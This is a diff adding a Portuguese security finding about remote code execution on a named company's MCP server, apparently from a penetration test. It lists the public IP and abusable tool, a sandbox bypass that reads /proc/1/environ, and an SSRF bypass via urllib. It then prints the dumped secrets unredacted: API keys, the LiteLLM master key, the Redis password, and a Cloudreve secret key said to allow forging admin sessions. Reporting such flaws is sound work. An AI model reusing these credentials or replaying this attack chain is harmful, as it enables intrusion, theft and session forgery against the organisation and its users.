@@ -1,0 +1,61 @@
+# F-MCP-RCE — MCP endpoint com RCE (entry point original ainda vulnerável)
+
+- **Data:** 2026-08-27T14:55Z
+- **Severidade:** 🔴 CRÍTICA (RCE em container da rede interna)
+- **Impacto:** Execução de código arbitrário no container MCP (172.19.0.3), acesso a rede interna Docker, SSRF para serviços internos, leitura de Redis e LiteLLM internos
+- **Origem:** prior-report/reports/02-CADEIA-DE-ATAQUE.md (ETAPA 2) — vetor não corrigido ~5 semanas após relatório anterior
+
+## Vetor
+1. `mcp-aws.dsoconcursos.com.br` tem IP real **3.83.108.124** (AWS, fora Cloudflare)
+2. Endpoint MCP em `/mcp` requer Bearer (LiteLLM master key `74fe8c6e...`)
+3. Tool `DSO-executar_python` executa Python em sandbox
+4. **Bypass do sandbox:** `pathlib.Path('/proc/1/environ').read_bytes()` — `pathlib` não está na blacklist (mesmo bug do relatório anterior)
+5. **Bypass do SSRF guard:** `urllib.request.urlopen()` não é bloqueado e bypassa o guard do `DSO-http_request` (que limita ports a [80,443])
+
+## Prova de RCE — /proc/1/environ (2026-08-27T14:55Z)
+```
+HOSTNAME=1cbc36509752
+TOOL_EXECUTOR_S3_ACCESS_KEY=c38cc592-f24b-4d2d-b850-b2bedeb9ffd9
+TOOL_EXECUTOR_S3_BUCKET_ARTIFACTS=dsoconcursos-prod
+REDIS_URL=redis://default:64cd689b279918b4c2f963843dd5b4f7a4d1dddf9a26d9754bb282f2bd636299@172.18.0.5:6379/2
+LITELLM_BASE_URL=http://172.18.2.49:4000/v1
+LITELLM_API_KEY=74fe8c6e5bd34df9e6c889d3c9c56c6c8a1ded504c57c6391d46f3c28c045769
+TOOL_EXECUTOR_SECRET=82d1e336a717b792b092bb36ab4686595df4780d57e43cd41601bb1360469299
+HTTP_REQUEST_TRUSTED_CIDRS=172.18.0.0/16
+MCP_ALLOWED_HOSTS=172.18.1.70:*,tool-executor:*
+TAVILY_API_KEY=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
+AGENT_MODEL=deepseek/deepseek-v4-pro
+AI_ARTIFACT_REGISTER_URL=https://api.dsoconcursos.com.br/api/v1/ai/tools/artifacts/register
+```
+
+## Prova de SSRF — urllib bypass (2026-08-27T14:57Z)
+- `urllib.request.urlopen("http://172.18.2.49:4000/v1/models")` → 401 (LiteLLM interno REACHABLE)
+- `urllib.request.urlopen("http://172.18.0.5:6379/")` → TCP connected (Redis interno REACHABLE)
+- SSRF guard do `DSO-http_request` limita ports a [80,443] mas `urllib.request` bypassa
+
+## Redis interno comprometido (db=2, 180 chaves)
+- Host: `172.18.0.5:6379` password: `64cd689b279918b4c2f963843dd5b4f7a4d1dddf9a26d9754bb282f2bd636299`
+- Sistema: **Cloudreve CMS** (`cloudreve.dsoconcursos.com.br`)
+- `setting_secret_key` = `Arz1l8M6Xwp4MpnBaS36zKqZoU9U2UisqrG5b80MLeuP0nNpWGmsoeh16u20soooXy31Xbiy8PyFVHWuvMITp4g7jv6QRWkt0OZDwCCioZ9amgtMfWVqQ8mxJRjxdQzo54bJo2W7JVn0yuYuJiHc9MngPwXB4BpqcEV5XsriAYeNosFZmKkhQYGGRVIp2W3RnSzsc3Vq5N1EDTNlYkqF9VfnZM1O5P59XWw1ole2YlxccnWYAD5rCOBPTbY`
+  → Permite forjar sessões admin do Cloudreve (JWT/session)
+- `setting_hash_id_salt` = `skRMTPI71DRXIBVU4399DbRGHZ6Shwdc9D43sdBI0y93fgh8aAnaKVGefDgdpjpu`
+- `setting_siteID` = `8888595c-65f9-41e6-93ba-c194eb65d688`
+- `setting_oidc_config` = `{"direct_sign_in":true,"display_name":"vas.sso","scopes":"email"}`
+- `jwt_revoke_*` (3 tokens de revogação JWT ativos)
+
+## LiteLLM interno comprometido
+- Host: `172.18.2.49:4000` (interno) / `litellm.dsoconcursos.com.br` (externo)
+- Master key: `74fe8c6e5bd34df9e6c889d3c9c56c6c8a1ded504c57c6391d46f3c28c045769`
+- **350 modelos** acessíveis: deepseek/deepseek-v4-pro, dso-chat-*, local-agent, local-laws-ptbr, qwen3.6-35b, etc.
+- Acesso admin completo ao proxy de IA (criar virtual keys, ver usage/custos)
+
+## Source code do MCP server (em /app/)
+- `config.py`, `auth.py`, `mcp_server.py`, `code_validator.py`, `sync_http_client.py`, `job_store_redis.py`, etc.
+- `certs/` — diretório de certificados
+
+## Rede interna
+- Container MCP: 172.19.0.3 (Docker network 172.19.0.0/16, Tailscale: taila75cb0.ts.net)
+- Redis: 172.18.0.5:6379 ✅ reachable
+- LiteLLM: 172.18.2.49:4000 ✅ reachable
+- GitLab: 172.18.2.163 ❌ timeout (subnet não roteável do container MCP)
+- API .NET: 172.18.2.211:443 (SSL error — reachable mas SNI required)
